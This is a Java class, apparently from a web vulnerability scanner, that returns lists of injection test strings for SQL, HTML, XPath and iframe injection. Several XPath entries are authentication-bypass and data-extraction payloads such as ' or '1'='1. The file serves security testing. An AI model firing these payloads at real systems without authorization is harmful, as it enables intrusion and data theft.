/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package payload;

import java.util.ArrayList;

/**
 *
 * @author Shaco JX
 */
public class A1p {

    public ArrayList<String> SQLinjection() {
        ArrayList<String> list = new ArrayList<>();
        list.add("'");
        list.add("')");
        list.add("';");
        list.add("\"");
        list.add("\")");
        list.add("\";");
        list.add("%27");
        list.add("%%2727");
        list.add("%25%27");
        list.add("%60");
        list.add("%5C");
        return list;
    }

    public ArrayList<String> HTMLinjection() {
        ArrayList<String> list = new ArrayList<>();
        list.add("<h1>Test</h1>");
        list.add("%3Ch1%3ETest%3C/h1%3E");
        return list;
    }

    public ArrayList<String> XMLXPathInjection() {
        ArrayList<String> list = new ArrayList<>();
        list.add("'");
        list.add("' or '1'='1");
        list.add("' or ''='");
        list.add("x' or 1=1 or 'x'='y");
        list.add("/");
        list.add("//");
        list.add("//*");
        list.add("*/*");
        list.add("@*");
        list.add("count(/child::node())");
        list.add("x' or name()='username' or 'x'='y");
        list.add("' and count(/*)=1 and '1'='1");
        list.add("' and count(/@*)=1 and '1'='1");
        list.add("' and count(/comment())=1 and '1'='1");
        list.add("1][1");
        list.add("last()-1 and 1=2");
        list.add("Bible\" and lower-case('A') = \"a");
        list.add("')]password | a[contains(a,'");
        list.add("') or contains(genre, '");
        list.add("') or not(contains(genre, 'praveen') and '1'='2");
        return list;
    }

    public ArrayList<String> IFrameInjection() {
        ArrayList<String> list = new ArrayList<>();
        list.add("\"><iframe><h1>Low</h1></iframe>");
        list.add("<iframe><h1>Low</h1></iframe>");
        return list;
    }

    

}
